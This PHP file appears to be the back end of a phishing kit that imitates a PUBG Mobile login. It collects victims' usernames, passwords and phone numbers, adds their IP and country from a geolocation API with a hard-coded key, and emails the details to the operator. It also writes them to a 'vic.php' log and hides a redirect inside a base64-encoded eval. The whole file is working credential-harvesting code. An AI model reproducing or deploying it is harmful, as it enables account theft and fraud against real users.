<?php
 $ip = $_SERVER['REMOTE_ADDR']; 
 $api_key = "acc6551c01c6e1870a7832c5314eb49f";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 $countryfromip = $jsondata->country_name;
 ?>

<?php
include ('../../admin/config.php');
$headers = "From: mynulledcodes@gmail.com";
$headers.= "Content-type: text/html";
$success = mail($mailto, $subjek, $body, $headers);
$handle = fopen("../../admin/vic.php", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "");
}
fwrite($handle, "");
fclose($handle);
$bilsmg.= "</center> <center><br>";
$file = fopen("../../admin/vic.php", "a");
fwrite($file, $bilsmg);
fclose($file);
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('../../admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
$phone = $_GET['phone'];
$login = $_GET['login'];
?>

<?php
include ('../../admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "PUBG $login|$username";
$body = <<<EOD

Username   =   $username
Password   =   $password
PhoneNum   =   $phone

     Private Details
VisitorIP  =   $ip
Conuntry   =   $countryfromip

Coming from   = $url
</div>
EOD;
$headers = "From: PubgMobile <mynulledcodes@gmail.com>";
$headers.= "";
$success = mail($result, $subjek, $body, $headers);

 eval("?>".base64_decode("PCA/cGhwIGhlYWRlcigiTG9jYXRpb246IGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL2NoYW5uZWwvVUNYYV9zZk10SWJobGFFT2N3VUxGSnVnP3N1Yl9jb25maXJtYXRpb249MSIpOyA/Pg==")); 
?>